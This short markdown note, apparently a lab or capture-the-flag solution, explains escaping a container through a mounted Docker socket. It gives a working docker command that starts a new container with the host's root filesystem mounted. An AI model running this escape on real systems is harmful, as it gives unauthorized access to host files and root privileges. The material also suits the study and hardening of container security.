# Socket Exploit Solution

You will often encounter mounted docker-sockets from within containers, for any variety of purposes.

However, an improperly secured container with the docker socket can be used to gain root access to the system

## Solution

Install the docker client from within the container, then point it at the socket like so, creating a new container with the host filesystem mounted.

`docker -H unix:///root/docker.sock run -it -v /:/root:ro ubuntu:latest`
